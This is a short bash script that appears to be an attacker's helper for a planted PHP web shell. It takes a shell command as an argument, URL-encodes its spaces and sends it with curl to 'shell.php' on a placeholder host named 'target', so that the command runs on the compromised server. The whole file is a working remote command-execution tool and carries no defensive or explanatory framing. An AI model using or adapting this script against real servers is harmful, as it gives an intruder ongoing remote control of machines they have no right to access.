#!/bin/bash
# ./cmder.sh "cmd"

string=$1
cmd=`echo "$string" |sed 's/ /%20/g'`
curl -G "http://target/shell.php?ll=$cmd"
